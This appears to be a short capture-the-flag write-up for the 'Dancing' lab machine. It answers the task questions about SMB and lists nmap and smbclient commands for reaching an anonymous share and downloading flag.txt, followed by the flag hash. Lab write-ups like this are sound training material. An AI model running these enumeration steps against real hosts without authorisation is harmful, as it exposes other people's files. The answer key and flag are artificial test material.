# Dancing  

## Task 1  
Q: What does the 3-letter acronym SMB stand for?  
A: Server Mesasge Block  

## Task 2  
Q: What port does SMB use to operate at?  
A: 445  

## Task 3  
Q: What is the service name for port 445 that came up in our Nmap scan?  
A: microsoft-ds  

## Task 4  
Q: What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?  
A: -L  

## Task 5  
Q: How many shares are there on Dancing?  
A: 4  

## Task 6  
Q: What is the name of the share we are able to access in the end with a blank password?  
A: WorkShares  

## Task 7  
Q: What is the command we can use within the SMB shell to download the files we find?  
A: get  

## SUBMIT FLAG  
``` text
1. scan open ports
    (1) [host] # nmap -sV ${ip}
2. list SMB shares with guest/anonymous authentication
    (1) [host] # smbclient -L ${ip}
3. connect to SMB shares with guest/anonymous authentication
    (1) [host] # smbclient \\\\${ip}\\WorkShares
4. get flag.txt
    (1) smb: \> ls
    (2) smb: \> cd James.P\
    (3) smb: \James.P\> ls
    (4) smb: \James.P\> get flag.txt
    (5) [host] cat flag.txt
```
A: 5f61c10dffbc77a704d76016a22f1664